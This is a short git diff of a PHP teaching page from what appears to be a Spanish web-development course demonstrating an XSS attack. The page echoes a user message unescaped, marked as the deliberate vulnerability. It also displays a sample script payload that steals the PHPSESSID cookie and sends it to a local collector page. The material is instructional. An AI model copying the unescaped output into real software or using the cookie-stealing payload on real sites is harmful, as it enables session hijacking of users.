@@ -28,7 +28,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <input type="submit" value="Enviar">
     </form>
     <p>Mensaje: <?php echo $message; ?></p> <!-- Vulnerabilidad aquí -->
-    <p>Incluir el siguiente código Javascript: <?php echo htmlspecialchars("<script>window.location.href = 'http://localhost/dsw_actividades/ut4/ejemplo_ataque_xss/recibe_phpsessid.php?phpsessid=' + document.cookie.match(/PHPSESSID=([^;]+)/)[1];</script>
+    <p>Incluir el siguiente código Javascript: <?php echo htmlspecialchars("<script>window.location.href = 'http://localhost/dsw_actividades/ut4/ataque_xss_ejemplo/recibe_phpsessid.php?phpsessid=' + document.cookie.match(/PHPSESSID=([^;]+)/)[1];</script>
 ");?></p>
 </body>
 </html>
